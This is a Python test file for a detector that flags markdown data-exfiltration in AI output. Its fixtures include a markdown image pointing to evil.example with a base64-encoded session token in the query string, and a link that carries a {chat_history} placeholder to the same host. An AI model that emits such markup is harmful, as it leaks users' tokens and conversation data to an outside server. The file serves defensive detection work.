from promptshield.detectors.markdown_exfil import MarkdownExfil
from promptshield.finding import Severity

LEAKY = "![logo](https://evil.example/pixel.png?d=c2Vzc2lvbi10b2tlbi0xMjM0NTY3OA)"


def test_image_with_data_is_high(run):
    findings = run(MarkdownExfil(), LEAKY)
    assert findings[0].severity is Severity.HIGH
    assert "evil.example" in findings[0].message


def test_link_with_template_placeholder(run):
    assert run(MarkdownExfil(), "[click](https://evil.example/?q={chat_history})")


def test_plain_image_ok(run):
    assert not run(MarkdownExfil(), "![cat](https://images.example/cat.png)")


def test_allowlisted_domain(run):
    assert not run(MarkdownExfil(allowed_domains=["evil.example"]), LEAKY)
    assert not run(MarkdownExfil(allowed_domains=["example"]), LEAKY)
